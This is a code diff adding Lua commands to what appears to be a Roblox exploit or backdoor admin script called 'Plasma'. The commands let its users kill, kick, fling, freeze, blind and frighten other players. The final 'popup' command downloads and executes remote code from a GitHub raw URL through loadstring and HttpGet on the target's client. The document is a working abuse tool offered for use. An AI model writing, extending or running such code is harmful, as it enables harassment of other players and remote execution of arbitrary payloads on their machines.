@@ -1,0 +1,181 @@
+addCmd("kill", 2, function(runner, target)
+	target.Character:FindFirstChildOfClass("Humanoid").Health = 0
+end)
+
+addCmd("bring", 2, function(runner, target)
+	if not runner.Character then return end
+	target.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
+	task.wait(.1)
+	target.Character:PivotTo(runner.Character:GetPivot())
+end)
+
+addCmd("check", 2, function()
+	local found = 0
+	for plr, lvl in pairs(users) do
+		if lvl == 1 or lvl == 2 then
+			found = found + 1
+			print(plr, lvl)
+		end
+	end
+	print("Found "..found.." plasma users")
+end)
+
+addCmd("sit", 2, function(runner, target)
+	target.Character:FindFirstChildOfClass("Humanoid").Sit = true
+end)
+
+addCmd("kick", 3, function(runner, target)
+	target:Kick("Kicked by Plasma Developer\n[Ggs from Plasma]")
+end)
+
+addCmd("fling", 2, function(runner, target)
+	 target.Character:FindFirstChild("HumanoidRootPart").RotVelocity = Vector3.new(3000, 8000, 2000)
+end)
+
+addCmd("cmds", 2, function()
+	for cmd, info in pairs(cmds) do
+		print("Cmd: "..cmd.." level:"..info["level"])
+	end
+end)
+
+addCmd("freeze", 2, function(runner, target)
+	 target.Character:FindFirstChild("HumanoidRootPart").Anchored = true
+end)
+
+addCmd("unfreeze", 2, function(runner, target)
+	 target.Character:FindFirstChild("HumanoidRootPart").Anchored = false
+end)
+
+addCmd("scare", 2, function(runner, target)
+	if target ~= lp then return end
+    local image = math.random(1, 2)
+    local imgs = {
+		"100342654461681",
+		"140205297869742"
+    } 
+    local screenGUI = Instance.new("ScreenGui", game:GetService("CoreGui"))
+    screenGUI.IgnoreGuiInset = true
+    local imageLabel = Instance.new("ImageLabel", screenGUI)
+    imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    imageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    imageLabel.Image = "rbxassetid://"..imgs[image]
+    imageLabel.ImageTransparency = 0
+    imageLabel.BackgroundTransparency = 1
+    imageLabel.Size = UDim2.new(1, 0, 1, 0)
+    local duration = TweenInfo.new(5)
+    local tween1 = TweenService:Create(imageLabel, duration, {
+        ImageTransparency = 1
+    })
+    tween1:Play()
+    tween1.Completed:Wait()
+    task.wait(.1)
+    screenGUI:Destroy()
+end)
+
+addCmd("blind", 2, function(runner, target)
+	if target ~= lp then return end
+	if game:GetService("CoreGui"):FindFirstChild("blinded") then return end
+    local screenGUI = Instance.new("ScreenGui", game:GetService("CoreGui"))
+    screenGUI.IgnoreGuiInset = true
+    screenGUI.Name = "blinded"
+    local frame = Instance.new("Frame", screenGUI)
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    frame.BackgroundTransparency = 0
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+end)
+
+addCmd("unblind", 2, function(runner, target)
+	if target ~= lp then return end
+	if game:GetService("CoreGui"):FindFirstChild("blinded") then
+		game:GetService("CoreGui").blinded:Destroy()
+	end
+end)
+
+addCmd("gull", 3, function(runner, target)
+	spawn(function()
+-- credits to our dev cammy
+		local char = target.Character
+		char.PrimaryPart = char.HumanoidRootPart
+
+		local tors = char.HumanoidRootPart
+		local initCFrame = tors.CFrame
+		tors.Anchored = true
+		local gull = Instance.new("Part")
+		gull.Anchored = true
+		gull.CanCollide = false
+		gull.Position = Vector3.new(0,100000,0)
+		local mesh = Instance.new("SpecialMesh",gull)
+		mesh.MeshId = "http://www.roblox.com/asset/?id=272501436"
+		mesh.TextureId = "http://www.roblox.com/asset/?id=267684509"
+		mesh.Scale = Vector3.new(10,10,10)
+
+		local leftWing = Instance.new("Part",gull)
+		leftWing.CanCollide = false
+		local lmesh = Instance.new("SpecialMesh",leftWing)
+		lmesh.MeshId = "http://www.roblox.com/asset/?id=267684584"
+		lmesh.TextureId = "http://www.roblox.com/asset/?id=267684509"
+		lmesh.Scale = Vector3.new(10,10,10)
+		local leftMotor = Instance.new("Motor6D",gull)
+		leftMotor.MaxVelocity = 1
+		leftMotor.Part0 = gull
+		leftMotor.Part1 = leftWing
+		leftMotor.C0 = CFrame.new(-50.2919998, -0.0920021087, 0.280000001)
+
+		local rightWing = Instance.new("Part",gull)
+		rightWing.CanCollide = false
+		local rmesh = Instance.new("SpecialMesh",rightWing)
+		rmesh.MeshId = "http://www.roblox.com/asset/?id=267684651"
+		rmesh.TextureId = "http://www.roblox.com/asset/?id=267684509"
+		rmesh.Scale = Vector3.new(10,10,10)
+		local rightMotor = Instance.new("Motor6D",gull)
+		rightMotor.MaxVelocity = 1
+		rightMotor.Part0 = gull
+		rightMotor.Part1 = rightWing
+		rightMotor.C0 = CFrame.new(47.1930008, -0.0670021027, 0.280000001)
+
+		local sound = Instance.new("Sound",gull)
+		sound.SoundId = "rbxassetid://160877039"
+		sound.Volume = 10
+		gull.Parent = workspace
+
+		for i = 400,-1000,-2 do
+			local der = 0.02*i
+			local angle = math.atan(der/1)
+			gull.CFrame = initCFrame*CFrame.Angles(angle,math.pi,0) + initCFrame.lookVector * (i+5) + Vector3.new(0,0.01*i^2+7,0)
+			if i == 0 then sound:Play() end
+			if i <= 0 then
+				tors.Anchored = false
+				char:SetPrimaryPartCFrame(gull.CFrame)
+				tors.Velocity = Vector3.new(0,1,0)
+				local nextAngle = -0.2*math.sin(0.05*math.pi*(i))
+				leftMotor.DesiredAngle = -nextAngle
+				leftMotor.C0 = CFrame.new(-50.2919998, 47.193*math.tan(nextAngle), 0.280000001)
+				rightMotor.DesiredAngle = nextAngle
+				rightMotor.C0 = CFrame.new(47.1930008, 47.193*math.tan(nextAngle), 0.280000001)
+			end
+			wait()
+		end
+
+		local function KICK()
+			spawn(function()
+				char:FindFirstChildOfClass("Humanoid").Health = 0
+			end)
+		end
+
+		spawn(function()
+			KICK()
+		end)
+
+		local go = Instance.new("BodyVelocity",gull)
+		go.Velocity = Vector3.new(0,1000,0)
+		go.MaxForce = Vector3.new(1000000,1000000,1000000)
+		gull.Anchored = false
+	end)
+end)
+
+addCmd("popup",2,function(runner, target)
+	if target ~= lp then return end
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/jj123llol/test/refs/heads/main/ajwcTYO.txt",true))()
+end)
